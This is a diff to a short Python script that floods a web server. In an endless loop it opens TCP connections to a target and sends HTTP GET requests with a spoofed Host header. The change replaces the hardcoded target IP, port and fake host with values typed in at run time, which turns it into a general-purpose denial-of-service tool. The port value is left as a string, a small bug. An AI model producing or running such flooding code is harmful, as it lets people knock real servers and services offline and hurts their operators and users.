@@ -3,16 +3,16 @@
 import socket
 import threading
 
-target = '192.168.40.22' #dontdoit
-port = 80
-fake_ip = '182.21.20.32' #host
+target = str(input("Target IP : "))
+port = input("port : ")
+host= str(input("Host IP : ")) 
 
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target,port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target,port))
+        s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
         s.close()
 
 #threads
